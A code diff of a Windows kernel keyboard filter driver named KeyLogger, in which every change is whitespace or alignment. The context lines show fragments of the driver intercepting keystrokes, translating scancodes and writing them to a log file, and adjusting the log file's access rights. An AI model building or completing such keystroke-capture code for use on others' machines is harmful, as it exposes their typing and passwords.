@@ -233,7 +233,7 @@ OpenLogFile
 
 	IO_STATUS_BLOCK		ioStatusBlock;
 	OBJECT_ATTRIBUTES	fileObjectAttributes;
-	NTSTATUS			status;
+	NTSTATUS		status;
 	UNICODE_STRING		fileName;
 
 	//
@@ -280,7 +280,7 @@ OpenLogFile
 NTSTATUS
 WriteToLogFile
 (
-	DWORD					n,
+	DWORD			n,
 	PKEYBOARD_INPUT_DATA	buffer
 )
 /**
@@ -320,8 +320,8 @@ WriteToLogFile
 	//
 	for (i = 0; i < n; i++)
 	{
-		scancode		= buffer[i].MakeCode;
-		flags			= buffer[i].Flags;
+		scancode	= buffer[i].MakeCode;
+		flags		= buffer[i].Flags;
 
 		CHAR* asciiRepr = keytable[scancode];
 
@@ -361,7 +361,7 @@ WriteToLogFile
 	IO_STATUS_BLOCK		ioStatusBlock;
 	LARGE_INTEGER		ByteOffset;
 	
-	ByteOffset.HighPart = -1;
+	ByteOffset.HighPart	= -1;
 	ByteOffset.LowPart	= FILE_WRITE_TO_END_OF_FILE;
 
 	status = STATUS_SUCCESS;
@@ -409,8 +409,8 @@ SetFileDacl
  **/
 {
 	SECURITY_DESCRIPTOR		sd;
-	PACL					acl;
-	NTSTATUS				status;
+	PACL				acl;
+	NTSTATUS			status;
 
 	acl = NULL;
 	status = STATUS_SUCCESS;
@@ -508,8 +508,8 @@ ResetFileDacl
  **/
 {
 	SECURITY_DESCRIPTOR		sd;
-	PACL					pAcl;
-	NTSTATUS				status;
+	PACL				pAcl;
+	NTSTATUS			status;
 
 	pAcl = NULL;
 	status = STATUS_SUCCESS;
@@ -690,12 +690,12 @@ DriverEntry(
     // Create a framework driver object.
     //
     status = WdfDriverCreate(
-		DriverObject,
+	DriverObject,
         RegistryPath,
         WDF_NO_OBJECT_ATTRIBUTES,
         &config,
         WDF_NO_HANDLE
-	);
+    );
 
     if (!NT_SUCCESS(status))
 	{
@@ -775,9 +775,9 @@ KeyLogger_EvtDeviceAdd(
     // outstanding ioctl request sent earlier to the port driver.
     //
     WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(
-		&ioQueueConfig,
+	&ioQueueConfig,
         WdfIoQueueDispatchParallel
-	);
+    );
 
     //
     // Framework by default creates non-power managed queues for
@@ -786,11 +786,11 @@ KeyLogger_EvtDeviceAdd(
     ioQueueConfig.EvtIoInternalDeviceControl = KeyLogger_EvtIoInternalDeviceControl;
 
     status = WdfIoQueueCreate(
-		hDevice,
+	hDevice,
         &ioQueueConfig,
         WDF_NO_OBJECT_ATTRIBUTES,
         WDF_NO_HANDLE
-	);
+    );
 
     if (!NT_SUCCESS(status))
 	{
@@ -956,9 +956,9 @@ KeyLogger_EvtIoInternalDeviceControl(
 VOID
 KeyLogger_ServiceCallback(
     IN PDEVICE_OBJECT		DeviceObject,
-    IN PKEYBOARD_INPUT_DATA InputDataStart,
-    IN PKEYBOARD_INPUT_DATA InputDataEnd,
-    IN OUT PULONG			InputDataConsumed
+    IN PKEYBOARD_INPUT_DATA 	InputDataStart,
+    IN PKEYBOARD_INPUT_DATA 	InputDataEnd,
+    IN OUT PULONG		InputDataConsumed
 )
 /**
  *
@@ -970,7 +970,7 @@ KeyLogger_ServiceCallback(
  **/
 {
     PDEVICE_EXTENSION   devExt;
-    WDFDEVICE			hDevice;
+    WDFDEVICE		hDevice;
 
     hDevice = WdfWdmDeviceGetWdfDeviceHandle(DeviceObject);
 
@@ -979,7 +979,7 @@ KeyLogger_ServiceCallback(
 	//
     devExt = GetDeviceExtension(hDevice);
 
-	ULONG					totalKeys;
+	ULONG			totalKeys;
 	PKEYBOARD_INPUT_DATA	inputKey;
 	
 	totalKeys	= (ULONG)(InputDataEnd - InputDataStart);
@@ -1097,8 +1097,8 @@ CreateWorkItem(
 	NTSTATUS status = STATUS_SUCCESS;
 
 	WDF_OBJECT_ATTRIBUTES		workItemAttributes;
-	WDF_WORKITEM_CONFIG			workitemConfig;
-	//WDFWORKITEM					hWorkItem;
+	WDF_WORKITEM_CONFIG		workitemConfig;
+	//WDFWORKITEM			hWorkItem;
 
 	WDF_OBJECT_ATTRIBUTES_INIT(&workItemAttributes);
 
